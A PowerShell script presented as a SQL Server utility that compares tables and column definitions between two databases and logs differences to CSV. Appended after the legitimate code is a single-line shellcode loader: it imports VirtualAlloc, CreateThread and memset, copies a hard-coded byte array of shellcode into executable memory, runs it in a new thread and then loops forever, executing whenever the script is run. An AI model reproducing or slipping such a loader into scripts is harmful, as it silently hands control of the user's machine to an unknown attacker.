param( 
	$SqlServerOne = 'YourDatabaseServer',
	$FirstDatabase = 'FirstDatabaseToCompare', 
	$SqlUsernameOne = 'SQL Login',
	$SqlPasswordOne = 'SQL Password',
	$SqlServerTwo = 'YourDatabaseServer',
	$SecondDatabase = 'SecondDatabaseToCompare', 
	$SqlUsernameTwo = 'SQL Login',
	$SqlPasswordTwo = 'SQL Password',
	$FilePrefix = 'Log',
	[switch]$Log,
	[switch]$Column
	)

$File = $FilePrefix + '{0}-{1}.csv'

$TableQuery = "	select sysobjects.name as TableName
	from sysobjects
	where sysobjects.xtype like 'U' and --specify only user tables
	sysobjects.name not like 'dtproperties' --specify only user tables"

function Run-Query()
{
	param (
	$SqlQuery,
	$SqlServer,
	$SqlCatalog, 
	$SqlUser,
	$SqlPass
	)
	
	$SqlConnString = "Server = $SqlServer; Database = $SqlCatalog; user = $SqlUser; password = $SqlPass"
	$SqlConnection = New-Object System.Data.SqlClient.SqlConnection
	$SqlConnection.ConnectionString = $SqlConnString
	
	$SqlCmd = New-Object System.Data.SqlClient.SqlCommand
	$SqlCmd.CommandText = $SqlQuery
	$SqlCmd.Connection = $SqlConnection
	
	$SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
	$SqlAdapter.SelectCommand = $SqlCmd
	
	$DataSet = New-Object System.Data.DataSet
	$a = $SqlAdapter.Fill($DataSet)
	
	$SqlConnection.Close()
	
	$DataSet.Tables | Select-Object -ExpandProperty Rows
}

$TablesDBOne = Run-Query -SqlQuery $TableQuery -SqlServer $SqlServerOne -SqlCatalog $FirstDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property TableName

$TablesDBTwo = Run-Query -SqlQuery $TableQuery -SqlServer $SqlServerTwo -SqlCatalog $SecondDatabase -SqlUser $SqlUsernameTwo -SqlPass $SqlPasswordTwo | Select-Object -Property TableName

Write-Host 'Differences in Tables: '
$Database = @{Name='Database';Expression={if ($_.SideIndicator -eq '<='){'{0} / {1}' -f $FirstDatabase, $SqlServerOne} else {'{0} / {1}' -f $SecondDatabase, $SqlServerTwo}}}
$TableDifference  = Compare-Object $TablesDBOne $TablesDBTwo -SyncWindow (($TablesDBOne.count + $TablesDBTwo.count)/2) -Property TableName | select TableName, $Database

if ($log)
{
	$TableDifference | Export-Csv -Path ($file -f $FirstDatabase, $SecondDatabase) -NoTypeInformation
}

$TableDifference | Sort-Object -Property TableName, Database


if ($Column)
{
	
	$SameTables = Compare-Object $TablesDBOne $TablesDBTwo -SyncWindow (($TablesDBOne.count + $TablesDBTwo.count)/2) -Property TableName -IncludeEqual -ExcludeDifferent 
	
	$ColumnQuery = @"
select sysobjects.name as TableName
	, syscolumns.name as ColumnName 
	, systypes.name as Type
	, systypes.Length
	, systypes.XUserType
from sysobjects, syscolumns, systypes
where sysobjects.xtype like 'U' and --specify only user tables
	sysobjects.name not like 'dtproperties' and --specify only user tables
	syscolumns.xusertype= systypes.xusertype --get data type info
	and sysobjects.id=syscolumns.id 
	and sysobjects.name = '{0}'
order by sysobjects.name, syscolumns.name, syscolumns.type
"@
	
	Write-Host "`n`n"
	Read-Host 'Press Enter to Check for Column Differences'
	
	foreach ($Table in $SameTables)
	{
		$ColumnsDBOne = Run-Query -SqlQuery ($ColumnQuery -f $table.tablename)  -SqlServer $SqlServerOne -SqlCatalog $FirstDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property TableName, ColumnName, Type, Length, XUserType

		$ColumnsDBTwo = Run-Query -SqlQuery ($ColumnQuery -f $table.tablename) -SqlServer $SqlServerTwo -SqlCatalog $SecondDatabase -SqlUser $SqlUsernameTwo -SqlPass $SqlPasswordTwo | Select-Object -Property TableName, ColumnName, Type, Length, XUserType
		
		$ColumnDifference = Compare-Object $ColumnsDBOne $ColumnsDBTwo -SyncWindow (($ColumnsDBOne.count + $ColumnsDBTwo.count)/2) -Property TableName, ColumnName, Type, Length, XUserType | Select-Object TableName, ColumnName, Type, Length, XUserType, $Database
		
		if ($log -and $ColumnDifference )
		{
			$ColumnDifference | Export-Csv -Path ($file -f $Table.TableName,'Columns' ) -NoTypeInformation
		}
		
		$ColumnDifference | sort ColumnName, Database
		
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x7e,0x88,0x10,0x58,0xd9,0xce,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xea,0xfc,0x03,0x5a,0x71,0x6a,0xe5,0xa4,0x65,0xe8,0x06,0x55,0x75,0x8d,0x8f,0xb0,0x44,0x8d,0xf4,0xb1,0xf6,0x3d,0x7e,0x97,0xfa,0xb6,0xd2,0x0c,0x89,0xbb,0xfa,0x23,0x3a,0x71,0xdd,0x0a,0xbb,0x2a,0x1d,0x0c,0x3f,0x31,0x72,0xee,0x7e,0xfa,0x87,0xef,0x47,0xe7,0x6a,0xbd,0x10,0x63,0xd8,0x52,0x15,0x39,0xe1,0xd9,0x65,0xaf,0x61,0x3d,0x3d,0xce,0x40,0x90,0x36,0x89,0x42,0x12,0x9b,0xa1,0xca,0x0c,0xf8,0x8c,0x85,0xa7,0xca,0x7b,0x14,0x6e,0x03,0x83,0xbb,0x4f,0xac,0x76,0xc5,0x88,0x0a,0x69,0xb0,0xe0,0x69,0x14,0xc3,0x36,0x10,0xc2,0x46,0xad,0xb2,0x81,0xf1,0x09,0x43,0x45,0x67,0xd9,0x4f,0x22,0xe3,0x85,0x53,0xb5,0x20,0xbe,0x6f,0x3e,0xc7,0x11,0xe6,0x04,0xec,0xb5,0xa3,0xdf,0x8d,0xec,0x09,0xb1,0xb2,0xef,0xf2,0x6e,0x17,0x7b,0x1e,0x7a,0x2a,0x26,0x76,0x4f,0x07,0xd9,0x86,0xc7,0x10,0xaa,0xb4,0x48,0x8b,0x24,0xf4,0x01,0x15,0xb2,0xfb,0x3b,0xe1,0x2c,0x02,0xc4,0x12,0x64,0xc0,0x90,0x42,0x1e,0xe1,0x98,0x08,0xde,0x0e,0x4d,0xa4,0xdb,0x98,0xd0,0xce,0x36,0x0c,0x45,0x33,0xb7,0xbd,0xc4,0xba,0x51,0xed,0xb6,0xec,0xcd,0x4d,0x67,0x4d,0xbe,0x25,0x6d,0x42,0xe1,0x55,0x8e,0x88,0x8a,0xff,0x61,0x65,0xe2,0x97,0x18,0x2c,0x78,0x06,0xe4,0xfa,0x04,0x08,0x6e,0x09,0xf8,0xc6,0x87,0x64,0xea,0xbe,0x67,0x33,0x50,0x68,0x77,0xe9,0xff,0x94,0xed,0x16,0x56,0xc3,0x99,0x14,0x8f,0x23,0x06,0xe6,0xfa,0x38,0x8f,0x72,0x45,0x56,0xf0,0x92,0x45,0xa6,0xa6,0xf8,0x45,0xce,0x1e,0x59,0x16,0xeb,0x60,0x74,0x0a,0xa0,0xf4,0x77,0x7b,0x15,0x5e,0x10,0x81,0x40,0xa8,0xbf,0x7a,0xa7,0x28,0x83,0xac,0x81,0x5e,0xed,0x6c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

